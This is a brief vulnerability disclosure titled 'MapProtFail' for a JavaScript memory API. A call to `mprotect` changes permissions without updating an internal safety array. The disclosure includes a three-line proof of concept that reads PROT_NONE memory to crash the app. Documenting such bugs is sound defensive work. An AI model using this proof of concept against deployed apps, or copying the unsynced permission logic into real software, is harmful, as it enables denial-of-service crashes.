# VID 009: MapProtFail

### Description

A attacker could pass a permission change to `memory.mprotect(ptr, size, prot);` which will cause the change to happen but not on the safety array. When the attacker then does a unauthorized action on the allocated memory zone it can cause a unexpected app termination

### Exploitation

```js
// map the memory with read permissions
let ptr = memory.mmap(1024, PROT_READ, MAP_ANON | MAP_PRIVATE);

// change the permissions to none
memory.mprotect(ptr, 1024, PROT_NONE);

// now attempt to read, as its still marked as readable in the safety array it will attempt to read from this memory address and cause the crash because of a EXC_BAD_ACCESS
memory.mread8(ptr);
```
